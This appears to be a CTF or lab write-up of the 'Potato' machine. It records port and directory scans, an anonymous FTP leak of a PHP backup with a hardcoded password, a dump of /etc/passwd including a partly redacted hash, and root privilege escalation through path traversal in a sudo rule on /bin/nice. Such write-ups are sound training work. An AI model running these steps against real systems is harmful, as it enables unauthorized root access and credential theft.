# NMAP
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDamdAqH2ZyWoYj0tstPK0vbVKI+9OCgtkGDoynffxqV2kE4ceZn77FBuMGFKLU50Uv5RMUTFTX4hm1ijh77KMGG1CmAk2YWvEDhxbCBPCohp+xXMBXHBYoMbEVl/loKL2UW6USnKorOgwxUdoMAwDxIrohGHQ5WNUADRaqt1eHuHxuJ8Bgi8yzqP/26ePQTLCfwAZMq+SYPJedZBmfJJ3Brhb/CGgzgRU8BpJGI8IfBL5791JTn2niEgoMAZ1vdfnSx0m49uk8npd0h5hPQ+ucyMh+Q35lJ1zDq94E24mkgawDhEgmLtb23JDNdY4rv/7mAAHYA5AsRSDDFgmbXEVcC7N1c3cyrwVH/w+zF5SKOqQ8hOF7LRCqv0YQZ05wyiBu2OzbeAvhhiKJteICMuitQAuF6zU/dwjX7oEAxbZ2GsQ66kU3/JnL4clTDATbT01REKJzH9nHpO5sZdebfLJdVfx38qDrlS+risx1QngpnRvWTmJ7XBXt8UrfXGenR3U=
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNoh1z4mRbfROqXjtv9CG7ZYGiwN29OQQCVXMLce4ejLzy+0Bvo7tYSb5PKVqgO5jd1JaB3LLGWreXo6ZY3Z8T8=
|   256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDXv++bn0YEgaoSEmMm3RzCzm6pyUJJSsSW9FMBqvZQ3
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     syn-ack ttl 63 ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

# Gobuster
```
gobuster dir -u http://192.168.65.101 -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.65.101
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /opt/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/08 13:48:12 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 316] [--> http://192.168.65.101/admin/]
/potato               (Status: 301) [Size: 317] [--> http://192.168.65.101/potato/]
Progress: 208312 / 882244 (23.61%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                   
===============================================================
2021/12/08 14:04:11 Finished
===============================================================
```

# Smbclient
```
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 ..
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

## index.php.bak
```
cat index.php.bak 
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

## /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$weba[REDACTED]/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

## local.txt
local.txt is located at /home/webadmin
```
webadmin@serv:~$ ls -la
total 32
drwxr-xr-x 3 webadmin webadmin 4096 Dec  8 06:07 .
drwxr-xr-x 4 root     root     4096 Aug  2  2020 ..
-rw------- 1 webadmin webadmin    0 Sep 28  2020 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug  2  2020 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug  2  2020 .bashrc
drwx------ 2 webadmin webadmin 4096 Dec  8 06:07 .cache
-rw-r--r-- 1 webadmin webadmin   33 Dec  8 05:48 local.txt
-rw-r--r-- 1 webadmin webadmin  807 Aug  2  2020 .profile
-rw------- 1 webadmin root       32 Sep 28  2020 user.txt
webadmin@serv:~$ cat local.txt
```

# PrivEsc
```
webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

webadmin@serv:/notes$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 .
drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
-rwx------  1 root root   11 Aug  2  2020 clear.sh
-rwx------  1 root root    8 Aug  2  2020 id.sh

webadmin@serv:/notes$ cat id.sh 
cat: id.sh: Permission denied

webadmin@serv:/notes$ echo test>test
-bash: test: Permission denied

webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)

webadmin@serv:/notes$ cd /tmp

webadmin@serv:/tmp$ echo "ls -la /root" > ls.sh

webadmin@serv:/tmp$ chmod +x ls.sh

webadmin@serv:/tmp$ sudo /bin/nice /notes/../tmp/ls.sh
total 32
drwx------  4 root root 4096 Dec  8 05:47 .
drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
-rw-------  1 root root    0 Sep 28  2020 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Dec  8 05:48 proof.txt
-rw-------  1 root root   32 Sep 28  2020 root.txt
drwxr-xr-x  3 root root 4096 Aug  2  2020 snap
drwx------  2 root root 4096 Aug  2  2020 .ssh

webadmin@serv:/tmp$ echo "cat /root/proof.txt" > ls.sh

webadmin@serv:/tmp$ sudo /bin/nice /notes/../tmp/ls.sh
```
